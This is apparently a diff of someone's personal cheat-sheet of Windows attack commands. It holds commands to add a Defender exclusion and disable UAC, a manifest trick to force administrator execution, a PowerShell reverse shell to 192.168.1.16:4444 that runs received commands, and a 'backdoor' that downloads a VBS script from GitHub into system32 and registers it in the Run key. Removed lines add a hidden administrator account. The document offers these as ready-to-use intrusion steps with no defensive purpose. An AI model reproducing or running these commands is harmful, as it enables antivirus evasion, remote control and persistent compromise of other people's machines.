@@ -1,11 +1,9 @@
-powershell Set-MpPreference -ExclusionPath <path> with administrator privs
+With Administrator Privs
+powershell Set-MpPreference -ExclusionPath <path> 
 to verify it was excluded :
 powershell -c "Get-MpPreference | Select-Object -ExpandProperty ExclusionPath"
 ---------------------------------------------------------------------------------------------------------------
-with administrator privs 
-To create user and set to localgroup administrators :
-net user Default 123 /add
-net localgroup Administrators Default /add
+With Administrator Privs
 To disable UAC :
 REG ADD "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v EnableLUA /t REG_DWORD /d 0 /f
 TO verify it's disabled :
@@ -13,7 +11,7 @@ reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v En
 To enable it again :
 REG ADD "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v EnableLUA /t REG_DWORD /d 1 /f
 ---------------------------------------------------------------------------------------------------------------
-checking administrator privs in run.bat
+Checking Administrator Privs in run.bat
 CLS
 >nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system" && (
     echo .
@@ -23,8 +21,8 @@ CLS
     exit /b 1
 )
 ---------------------------------------------------------------------------------------------------------------
-To embed .mainfest in .exe to make it run as administrator with Resource Hacker :
-with Resource Hacker 
+To embed .mainfest in .exe to make it runs as administrator :
+with Resource Hacker :
 <?xml version="1.0" encoding="UTF-8"?>
 <assembly xmlns="urn:schemas-microsoft-com:asm.v1" manifestVersion="1.0">
   <trustInfo xmlns="urn:schemas-microsoft-com:asm.v2">
@@ -39,7 +37,8 @@ with Resource Hacker
 obfuscated powershell 
 $C=new-object net.sockets.tcpclient('192.168.1.16',4444);$S=$C.GetStream();[byte[]]$B=0..65535|%{0};while(($I=$S.Read($B,0,$B.Length)) -ne 0){;$D=(new-object -typename System.Text.ASCIIEncoding).GetString($B,0,$I);$O=(iex $D 2>&1 | Out-String);$OB=$O+'PS '+(pwd).Path+'> ';$SB=([text.encoding]::ASCII).GetBytes($OB);$S.Write($SB,0,$SB.Length);$S.Flush()};$C.Close()
 ---------------------------------------------------------------------------------------------------------------
-backdoor runs after BIOS : with administrator privs
+With Administrator Privs
+backdoor runs after BIOS : 
 cd C:\Windows\system32
 curl https://raw.githubusercontent.com/omarsamyX0/shell3/main/start.vbs -o start.vbs
 reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "start" /t REG_SZ /d "%SystemRoot%\System32\start.vbs" /f
